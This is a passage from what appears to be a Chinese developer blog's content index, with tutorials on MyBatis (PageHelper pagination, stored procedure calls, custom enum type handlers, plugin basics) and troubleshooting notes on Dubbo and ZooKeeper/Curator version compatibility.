[com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,177 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,177 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,178 DEBUG PooledDataSource:391 - Returned connection 706895319 to pool. 观察上面的执行结果，可以发现使用 MyBatis 的批量操作插入多条数据时，不会发送多条 SQL 语句到数据库，这大大提高了业务逻辑的执行效率。 PageHelper 分页插件PageHelper 是 MyBatis 第三方的分页插件，支持任何复杂的单表、多表分页查询，部分特殊情况请看重要提示。 PageHelper 官方文档 PageHelper 使用方法 PageHelper API 文档 PageHelper 使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-21。 引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper&lt;/artifactId&gt; &lt;version&gt;5.3.1&lt;/version&gt;&lt;/dependency&gt; 注册插件 1234567&lt;configuration&gt; &lt;plugins&gt; &lt;plugin interceptor="com.github.pagehelper.PageInterceptor" /&gt; &lt;/plugins&gt;&lt;/configuration&gt; Mapper 接口 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmps();} SQL 映射文件 提示 在编写 SQL 语句的时候，不需要手动指定任何分页参数。 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmps" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;/select&gt;&lt;/mapper&gt; 业务逻辑，PageHelper 更多 API 的使用示例可以看 这里 1234567891011121314151617181920212223242526272829303132333435public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // 设置分页信息 Page&lt;Object&gt; page = PageHelper.startPage(2, 2); // 数据库查询 EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); List&lt;Employee&gt; employees = mapper.getEmps(); System.out.println(employees); // 获取分页信息 PageInfo&lt;Object&gt; pageInfo = page.toPageInfo(); System.out.println("总页数： " + pageInfo.getPages()); System.out.println("总记录数： " + pageInfo.getTotal()); System.out.println("当前的页码： " + pageInfo.getPageNum()); System.out.println("当前的记录数： " + pageInfo.getSize()); System.out.println("每页的记录数： " + pageInfo.getPageSize()); System.out.println("是否有下一页： " + pageInfo.isHasNextPage()); System.out.println("是否为第一页： " + pageInfo.isIsFirstPage()); System.out.println("是否为最后一页： " + pageInfo.isIsLastPage()); } finally { if (session != null) { session.close(); } } }} 执行结果 12345678910111213141523:16:35,705 DEBUG getEmps_COUNT:137 - ==&gt; Preparing: SELECT count(0) FROM t_employee23:16:35,763 DEBUG getEmps_COUNT:137 - ==&gt; Parameters: 23:16:35,802 DEBUG getEmps_COUNT:137 - &lt;== Total: 123:16:35,807 DEBUG getEmps:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee LIMIT ?, ?23:16:35,810 DEBUG getEmps:137 - ==&gt; Parameters: 2(Long), 2(Integer)23:16:35,812 DEBUG getEmps:137 - &lt;== Total: 1Page{count=true, pageNum=2, pageSize=2, startRow=2, endRow=4, total=3, pages=2, reasonable=false, pageSizeZero=false}[4_Tom_1_tom@gmail.com]总页数： 2总记录数： 3当前的页码： 2当前的记录数： 1每页的记录数： 2是否有下一页： false是否为第一页： false是否为最后一页： true MyBatis 调用存储过程存储过程（Stored Procedure）是一种存储在数据库中的复杂程序，以便外部程序调用的一种数据库对象。存储过程是为了完成特定功能的 SQL 语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名称并给定参数（需要时）来调用执行。存储过程的设计思想很简单，本质就是数据库 SQL 语言层面的代码封装与重用。 存储过程的优缺点存储过程的优点： 极大地提高 SQL 语言的功能和灵活性 可保证数据的安全性和完整性 通过存储过程可以使相关的动作在一起发生，从而可以维护数据库的完整性 通过存储过程可以使没有权限的用户在控制之下间接地存取数据库，从而保证数据的安全 极大地改善 SQL 语句的性能 在运行存储过程前，数据库已对其进行了语法和句法分析，并给出优化执行方案，这种已经编译好的过程可极大地改善 SQL 语句的性能。由于执行 SQL 语句的大部分解析工作已经完成，所以存储过程能以极快的速度执行 可以降低网络的通信量 客户端调用存储过程时，只需要传存储过程名和相关参数即可，与传输 SQL 语句相比自然数据量少了很多 存储过程的缺点： 开发阶段难以调试 难以移植，存储过程往往定制化于特定的数据库上，当切换到其他厂商的数据库系统时，往往需要重写原有的存储过程 如果在一个系统中大量的使用存储过程，到程序交付使用的时候，随着用户需求的增加会导致数据结构的变化，存储过程也要同步更新。最后如果用户想维护该系统可以说是很难的，而且代价是空前的，维护起来更麻烦 MySQL 存储过程的语法 声明语句结束符 12345delimiter $$或者delimiter // 声明存储过程 1create procedure demo_in_parameter(in p_in int) 存储过程的开始和结束符号 1begin .... end 变量定义 1declare l_int int unsigned default 4000000; 变量赋值 1set @p_in=1 调用存储过程 1call demo_in_parameter(); 删除存储过程 1drop procedure demo_in_parameter; 创建存储过程（完整的） 123456delimiter $$create procedure datetime()BEGIN select now();END $$delimiter ; 存储过程调用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-23。 提示 若需要调用存储过程，可以使用 &lt;select&gt; 标签，并设置标签的 statementType 属性为 CALLABLE 即可 &lt;select&gt; 标签体中存储过程的调用语法： { call procedure_name(#{param1_info}, #{param2_info}) } MySQL 存储过程调用案例一在下面的案例中，演示了如何在 MySQL 数据库中使用存储过程来根据员工 ID 查询员工的详细信息。 JavaBean 类 12345678public class Employee { private Long id; private String lastName; private String gender; private String email;} Mapper 接口 12345public interface EmployeeMapper { public Employee getEmpById(Long id);} 创建 MySQL 存储过程 123456delimiter $$create procedure query_single_employee(IN empId long)begin select id, last_name as lastName, gender, email from t_employee where id = empId;end $$delimiter ; SQL 映射文件 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- 调用存储过程（传入参数） --&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee" statementType="CALLABLE"&gt; { call query_single_employee(#{id, mode=IN, jdbcType=BIGINT}) } &lt;/select&gt;&lt;/mapper&gt; 业务逻辑 1234567891011121314151617181920public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getEmpById(1L); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} 执行结果 123422:58:51,817 DEBUG getEmpById:137 - ==&gt; Preparing: { call query_single_employee(?) }22:58:51,914 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:58:51,942 DEBUG getEmpById:137 - &lt;== Total: 122:58:51,942 DEBUG getEmpById:137 - &lt;== Updates: 0 Oracle 存储过程调用案例二MyBatis 对存储过程的游标提供了一个 JdbcType=CURSOR 的支持，可以智能地通过游标读取数据集，并将数据集自动映射到声明的结果集中。在下面的案例中，简单演示了如何在 Oracle 数据库中使用存储过程来实现分页查询的逻辑（这里只是简单演示，并未完全真正实现分页查询的逻辑）。 JavaBean 类 12345678public class Employee { private Long id; private String lastName; private String gender; private String email;} 12345678public class PageEmp { private int start; private int end; private int count; private List&lt;Employee&gt; emps;} Mapper 接口 1234public interface EmployeeMapper { public void getPageByProcedure(PageEmp page);} 创建 Oracle 存储过程 12345678910111213create or replace procedurepage_emp ( p_start in int, p_end in int, p_count out int, ref_cur out sys_refcursor) ASBEGIN select count(*) into p_count from t_employee; open ref_cur for select * from (select e.*, rownum as r1 from t_employee e where rownum &lt; p_end) where r1 &gt; p_start;END page_emp; SQL 映射文件 12345678910111213141516171819202122&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap id="EmpResultMap" type="com.clay.mybatis.bean.Employee"&gt; &lt;id column="id" property="id"/&gt; &lt;result column="last_name" property="lastName"/&gt; &lt;result column="gender" property="gender"/&gt; &lt;result column="email" property="email"/&gt; &lt;/resultMap&gt; &lt;!-- 调用存储过程，通过游标读取返回的数据集，并将数据集自动映射到声明的结果集中 --&gt; &lt;select id="getPageByProcedure" parameterType="com.clay.mybatis.bean.PageEmp" statementType="CALLABLE" databaseId="oracle"&gt; { call page_emp ( #{start, mode=IN, jdbcType=INTEGER}, #{end, mode=IN, jdbcType=INTEGER}, #{count, mode=OUT, jdbcType=INTEGER}, #{emps, mode=OUT, jdbcType=CURSOR, javaType=ResultSet, resultMap=EmpResultMap} ) } &lt;/select&gt;&lt;/mapper&gt; MyBatis 全局配置文件 12345&lt;!-- 数据库厂商标识 --&gt;&lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="MySQL" value="mysql"/&gt; &lt;property name="Oracle" value="oracle"/&gt;&lt;/databaseIdProvider&gt; 业务逻辑 12345678910111213141516171819202122public class MyBatisApplication { public static void main(String[] args) throws IOException { SqlSessionFactory sqlSessionFactory = getSqlSessionFactory(); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); PageEmp page = new PageEmp(); page.setStart(1); page.setEnd(5); mapper.getPageByProcedure(page); System.out.println("总记录数：" + page.getCount()); System.out.println("查出的数据：" + page.getEmps()); } finally { if (session != null) { session.close(); } } }} MyBatis 枚举类型处理器默认的枚举处理器MyBatis 在处理枚举类型对象的时候，默认是使用 EnumTypeHandler 枚举类型处理器将枚举的名称保存到数据库。若希望将枚举类型的索引值保存到数据库，则只需要在 MyBatis 的全局配置文件中指定使用 EnumOrdinalTypeHandler 枚举类型处理器即可，配置示例如下： 12345678&lt;configuration&gt; &lt;typeHandlers&gt; &lt;!-- 让 MyBatis 使用 EnumOrdinalTypeHandler 处理器来处理 AdminStatus 枚举类型 --&gt; &lt;typeHandler handler="org.apache.ibatis.type.EnumOrdinalTypeHandler" javaType="com.clay.mybatis.enums.AdminStatus"/&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; 自定义枚举类型处理器的步骤自定义枚举类型处理器的步骤如下: 1、实现 TypeHandler 接口或者继承 BaseTypeHandler 类 2、使用 @MappedType 注解定义要处理的 javaType 类型，使用 @MappedJdbcTypes 注解定义要处理的 jdbcType 类型，这一步骤可选 3、通过以下三种方式的任意一种来使用自定义的类型处理器 在参数处理的时候，声明要使用自定义的 TypeHandler 进行处理，例如： #{status, typeHandler=xxxx} 在 MyBatis 的全局配置文件中，指定 TypeHandler 要处理的 javaType 类型，例如：&lt;typeHandlers&gt; &lt;typeHandler handler="xxxx" javaType="xxxx"/&gt; &lt;/typeHandlers&gt; 在定义结果集标签的时候，声明要使用自定义的 TypeHandler 处理参数的封装，例如：&lt;resultMap&gt; &lt;result column="status" property="status" typeHandler="xxxx"&gt; &lt;/result&gt; &lt;/resultMap&gt; 自定义枚举类型处理器的案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-24。 创建数据库表 1234567CREATE TABLE `t_admin` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `status` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; JavaBean 类 12345678public class Admin { private Long id; private String name; private String email; private AdminStatus status;} 枚举类 1234567891011121314151617181920/** * 枚举接口 */public interface BaseEnum&lt;E extends Enum&lt;?&gt;, T&gt; { /** * 获取枚举值 * * @return 枚举值 */ T getValue(); /** * 获取枚举值描述 * * @return 枚举值的描述 */ String getDescription();} 123456789101112131415161718192021222324252627/** * 枚举实现类 */public enum AdminStatus implements BaseEnum&lt;AdminStatus, Integer&gt; { VALID(1, "有效"), INVALID(0, "无效"); private final Integer value; private final String description; @Override public Integer getValue() { return this.value; } @Override public String getDescription() { return this.description; } private AdminStatus(Integer value, String description) { this.value = value; this.description = description; }} 枚举类型处理器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import org.apache.ibatis.type.BaseTypeHandler;import org.apache.ibatis.type.JdbcType;import com.clay.mybatis.enums.BaseEnum;import java.sql.CallableStatement;import java.sql.PreparedStatement;import java.sql.ResultSet;import java.sql.SQLException;import java.util.Objects;/** * 枚举类型处理类 */public class AutoGenericEnumTypeHandler&lt;E extends BaseEnum&lt;?, ?&gt;&gt; extends BaseTypeHandler&lt;E&gt; { private Class&lt;E&gt; enumType; private E[] enums; public AutoGenericEnumTypeHandler() { } public AutoGenericEnumTypeHandler(Class&lt;E&gt; type) { if (Objects.isNull(type)) { throw new IllegalArgumentException("Type argument cannot be null"); } this.enumType = type; this.enums = type.getEnumConstants(); if (Objects.isNull(this.enums)) { throw new IllegalArgumentException(type.getName() + " does not represent an enum type"); } } private E loadEnum(Object index) { for (E e : enums) { if (e.getValue().toString().equals(index.toString())) { return e; } } throw new IllegalArgumentException(enumType.getName() + " unknown enumerated type index : " + index); } @Override public void setNonNullParameter(PreparedStatement ps, int i, E parameter, JdbcType jdbcType) throws SQLException { ps.setObject(i, parameter.getValue()); } @Override public E getNullableResult(ResultSet rs, String columnName) throws SQLException { if (Objects.isNull(rs.getObject(columnName))) { return null; } Object index = rs.getObject(columnName); return loadEnum(index); } @Override public E getNullableResult(ResultSet rs, int columnIndex) throws SQLException { if (Objects.isNull(rs.getObject(columnIndex))) { return null; } Object index = rs.getObject(columnIndex); return loadEnum(index); } @Override public E getNullableResult(CallableStatement cs, int columnIndex) throws SQLException { if (Objects.isNull(cs.getObject(columnIndex))) { return null; } Object index = cs.getObject(columnIndex); return loadEnum(index); }} Mapper 接口 123456public interface AdminMapper { public Admin getAdminById(Long id); public boolean addAdmin(Admin admin);} SQL 映射文件 1234567891011121314&lt;mapper namespace="com.clay.mybatis.dao.AdminMapper"&gt; &lt;select id="getAdminById" parameterType="Long" resultType="com.clay.mybatis.bean.Admin"&gt; select id, name, email, status from t_admin where id = #{id} &lt;/select&gt; &lt;insert id="addAdmin" parameterType="com.clay.mybatis.bean.Admin" useGeneratedKeys="true" keyProperty="id"&gt; insert into t_admin (name, email, status) values(#{name}, #{email}, #{status}) &lt;/insert&gt;&lt;/mapper&gt; MyBatis 的全局配置文件 12345678&lt;configuration&gt; &lt;typeHandlers&gt; &lt;!-- 让 MyBatis 使用 AutoGenericEnumTypeHandler 处理器来处理 AdminStatus 枚举类型 --&gt; &lt;typeHandler handler="com.clay.mybatis.handler.AutoGenericEnumTypeHandler" javaType="com.clay.mybatis.enums.AdminStatus" /&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; 业务代码 123456789101112131415161718192021222324252627public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { AdminMapper mapper = session.getMapper(AdminMapper.class); Admin entity = new Admin("admin", "admin@gmail.com", AdminStatus.VALID); mapper.addAdmin(entity); Admin admin = mapper.getAdminById(1L); System.out.println(admin); session.commit(); } finally { if (session != null) { session.close(); } } }} 执行结果 123456721:36:08,853 DEBUG addAdmin:137 - ==&gt; Preparing: insert into t_admin (name, email, status) values(?, ?, ?)21:36:08,892 DEBUG addAdmin:137 - ==&gt; Parameters: admin(String), admin@gmail.com(String), 1(Integer)21:36:08,893 DEBUG addAdmin:137 - &lt;== Updates: 121:36:08,909 DEBUG getAdminById:137 - ==&gt; Preparing: select id, name, email, status from t_admin where id = ?21:36:08,910 DEBUG getAdminById:137 - ==&gt; Parameters: 1(Long)21:36:08,927 DEBUG getAdminById:137 - &lt;== Total: 1Admin [id=1, name=admin, email=admin@gmail.com, status=VALID] 观察上面的执行结果，可以发现 MyBatis 会自动将枚举类型的 value 属性保存到数据库中，而不是保存枚举类型的名称或者索引值，同时查询数据后也会自动封装枚举类型的数据。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Kafka 知识图谱 (最新)",url:"/posts/ac64f898.html",text:'Kafka 学习路线基础知识 系统集成 生产调优 源码解析 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"前端开发知识图谱 (最新)",url:"/posts/3d316a65.html",text:'基础知识 服务与通信 存储、工作与协助 企业开发基础 Web 全栈开发 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"Dubbo 开发随笔",url:"/posts/c944ed24.html",text:'SpringBoot-2.1.0+ 整合 Apache Dubbo-2.7.0，启动应用后提示需要添加 SpringBoot 配置 “spring.main.allow-bean-definition-overriding=true” 异常日志： 1234567891011***************************APPLICATION FAILED TO START***************************Description:The bean \'dubboConfigConfiguration.Single\', defined in null, could not be registered. A bean with that name has already been defined in null and overriding is disabled.Action:Consider renaming one of the beans or enabling overriding by setting spring.main.allow-bean-definition-overriding=true 异常分析： 123问题是由注解 @EnableDubbo、@EnableDubboConfig 的使用所导致，具体可参考以下资料：https://github.com/apache/dubbo/issues/3193https://github.com/apache/dubbo-spring-boot-project/issues/476 解决方法： 12345方法一：往SpringBoot的配置文件（application.properties）中添加对应配置，允许在Spring容器内可以覆盖Bean的定义： spring.main.allow-bean-definition-overriding=true方法二：将Apache Dubbo-2.7.0 升级到 Apache Dubbo-2.7.1版本，具体可参考：https://github.com/apache/dubbo-spring-boot-project/issues/467 宕机环境下 Dubbo 的健壮性与高可用性介绍 监控中心宕掉不影响使用，只是丢失部分采样数据 数据库宕掉后，注册中心仍能通过缓存提供服务列表查询，但不能注册新服务 注册中心对等集群，任意一台宕掉后，将自动切换到另一台 注册中心全部宕掉后，服务提供者和服务消费者仍能通过本地缓存通讯 服务提供者无状态，任意一台宕掉后，不影响使用 服务提供者全部宕掉后，服务消费者应用将无法使用，并无限次重连等待服务提供者恢复 Dubbo 服务降级 当服务器压力剧增的情况下，根据实际业务情况及流量，对一些服务和页面有策略的不处理或换种简单的方式处理，从而释放服务器资源以保证核心交易正常运作或高效运作。Dubbo 可以通过服务降级功能临时屏蔽某个出错的非关键服务，并定义降级后的返回策略。Dubbo 向注册中心写入动态配置覆盖规则如下： 123RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();Registry registry = registryFactory.getRegistry(URL.valueOf("zookeeper://10.20.153.10:2181"));registry.register(URL.valueOf("override://0.0.0.0/com.foo.BarService?category=configurators&amp;dynamic=false&amp;application=foo&amp;mock=force:return+null")); 其中： mock=force:return+null 表示消费方对该服务的方法调用都直接返回 null 值，不发起远程调用。用来屏蔽不重要服务不可用时对调用方的影响。 还可以改为 mock=fail:return+null 表示消费方对该服务的方法调用在失败后，再返回 null 值，不抛异常。用来容忍不重要服务不稳定时对调用方的影响。 利用 Dubbo-Admin 的 UI 界面（旧版），可以方便地对服务进行屏蔽 / 恢复（mock=force:return+null）、容错 / 恢复（mock=fail:return+null）处理，即上面提到的两种服务降级方式 Dubbo 集群容错 在集群调用失败时，Dubbo 提供了多种容错方案，缺省为 failover 重试。真正的生产环境中，一般使用 Hystrix 进行容错处理。 Failover Cluster：失败自动切换，当出现失败，重试其它服务器。通常用于读操作，但重试会带来更长延迟。可通过 retries=”2” 来设置重试次数 (不含第一次)。 Failfast Cluster：快速失败，只发起一次调用，失败立即报错。通常用于非幂等性的写操作，比如新增记录。 Failsafe Cluster：失败安全，出现异常时，直接忽略。通常用于写入审计日志等操作。 Failback Cluster：失败自动恢复，后台记录失败请求，定时重发。通常用于消息通知操作。 Forking Cluster：并行调用多个服务器，只要一个成功即返回。通常用于实时性要求较高的读操作，但需要浪费更多服务资源。可通过 forks=”2” 来设置最大并行数。 Broadcast Cluster：广播调用所有提供者，逐个调用，任意一台报错则报错。通常用于通知所有提供者更新缓存或日志等本地资源信息。 1234Failover 重试次数的几种配置方式如下：&lt;dubbo:service retries="2" /&gt;&lt;dubbo:reference retries="2" /&gt;&lt;dubbo:reference&gt; &lt;dubbo:method name="findFoo" retries="2" /&gt; &lt;/dubbo:reference&gt; 123集群模式配置，按照以下几种配置方式在服务提供方和消费方配置集群模式：&lt;dubbo:service cluster="failsafe" /&gt;&lt;dubbo:reference cluster="failsafe" /&gt; Spring 与 SpringBoot 整合 Dubbo 整合 Dubbo 的三种方式 三种方式分别为：XML 配置、Annotation 配置、API 配置 Spring 与 SpringBoot 都支持以 XML 配置、Annotation 配置整合 Dubbo 由于使用基于注解的方式整合 Dubbo，无法实现 Dubbo 方法级的配置（即 dubbo:method 标签的功能），如果 Spring、SpringBoot 需要用到 Dubbo 方法级的配置，那么则需要使用 XML 的方式整合 Dubbo Spring 与 SpringBoot 整合 Dubbo 简单总结 SpringBoot + XML： @ImportResource SpringBoot + Annotation： @EnableDubbo Spring + Annotation： AnnotationConfigApplicationContext Spring + XML： ClassPathXmlApplicationContext、FileSystemXmlApplicationContext Dubbo 源码分析 1.Dubbo 框架设计介绍 2.XML 标签解析类：DubboNamespaceHandler、DubboBeanDefinitionParser 3.Dubbo 配置类之间的关系 4.Dubbo 的服务暴露 5.Dubbo 的服务引用 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式 开发随笔"},{title:"ZooKeeper 开发随笔",url:"/posts/7053c1b0.html",text:'Dubbo 使用 Curator 连接 ZooKeeper 失败异常日志： 1Caused by: org.apache.zookeeper.KeeperException$UnimplementedException: KeeperErrorCode = Unimplemented for /dubbo/xxx.xxx.service.UserService/providers/dubbo .... 异常分析：ZooKeeper 的版本与 Curator 的版本不兼容所导致，Curator 官网说明如下： 12345678910111213141516第一种情况：Curator 2.x.x compatible with both ZooKeeper 3.4.x and ZooKeeper 3.5.xCurator 3.x.x compatible only with ZooKeeper 3.5.x and includes support for new features such as dynamic reconfiguration, etc.第二种情况：ZooKeeper 3.5.x Curator 4.0 has a hard dependency on ZooKeeper 3.5.x If you are using ZooKeeper 3.5.x there\'s nothing additional to do - just use Curator 4.0ZooKeeper 3.4.x Curator 4.0 supports ZooKeeper 3.4.x ensembles in a soft-compatibility mode. To use this mode you must exclude ZooKeeper when adding Curator to your dependency management tool. 解决方法：针对第二种情况，假设各组件的版本分别为 Dubbo (2.7.0)、ZooKeeper (3.4.13)、Curator-Framework (4.0.1)，则需要排除 Curator-Framework (4.0.1) 默认依赖的高版本 ZooKeeper (3.5.x)，然后指定低版本的 ZooKeeper (3.4.x)，Maven 的 POM 写法如下： 12345678910111213141516171819202122232425&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.13&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-framework&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-recipes&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式 开发随笔"},{title:"MyBatis 入门教程之七",url:"/posts/c047293a.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 MyBatis 四大对象四大对象介绍MyBatis 的四大对象包括：Executor、StatementHandler、ParameterHandler、ResultSetHandler。四大对象的工作职责如下： Executor（执行器）：负责整个 SQL 执行过程的总体控制 StatementHandler（语句处理器）：负责和 JDBC 层交互，包括预编译 SQL 语句和执行 SQL 语句，以及调用 ParameterHandler 设置参数 ParameterHandler（参数处理器）：负责设置预编译参数 ResultSetHandler（结果集处理器）：负责将 JDBC 查询结果映射到 JavaBean 对象 四大对象的工作流程 MyBatis 插件开发本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-20。 插件介绍 MyBatis 在四大对象的创建过程中，都允许有插件进行介入。插件可以利用动态代理机制一层层的包装目标对象，从而实现在目标对象指向目标方法之前进行拦截的效果。 MyBatis 自定义插件是非常简单的，只需实现 Interceptor 接口，并指定想要拦截哪个对象的哪个方法，即可介入四大对象的任何一个方法的执行。 MyBatis 允许在已映射语句执行过程中的某一点进行拦截调用。 默认情况下，MyBatis 允许使用插件来拦截的方法包括： Executor：update, query, flushStatements, commit, rollback, getTransaction, close, isClosed StatementHandler：prepare, parameterize, batch, update, query ParameterHandler：getParameterObject, setParameters ResultSetHandler：handlerResultSets, handlerOuutputParameters 特别注意 自定义 MyBatis 插件时，如果你想做的不仅仅是监控方法的调用，那么你最好相当了解要重写的方法的行为。因为在试图修改或重写已有方法的行为时，很可能会破坏 MyBatis 的核心模块。这些都是更底层的类和方法，所以使用插件的时候需要特别小心。 插件原理 在 MyBatis 的全局配置文件里注册插件后，会按照插件的配置顺序，依次调用插件的 plugin() 方法来生成被拦截对象的动态代理对象 存在多个插件时，会依次生成目标对象的动态代理对象，层层包裹，先声明的先包裹，以此形成代理链 目标方法执行时，是按照插件配置信息的逆向顺序来执行 intercept() 方法，即先配置的插件会后执行 使用多个插件的情况下，往往需要在某个插件中分离出来目标对象，可以借助 MyBatis 提供的 SystemMateObject 类来获取最后一层的 h 以及 target 属性的值 插件开发案例Interceptor 接口 Interceptor.intercept()：拦截目标方法的执行 Interceptor.plugin()：创建动态代理对象，可以使用 MyBatis 提供的 Plugin 类的 wrap 方法 Interceptor.setProperties()：注入配置插件时设置的属性 插件开发案例一 实现 Interceptor 接口，并通过插件签名指定要拦截哪个对象的哪个方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.clay.mybatis.plugin;import java.sql.Connection;import java.util.Properties;import org.apache.ibatis.executor.statement.StatementHandler;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import 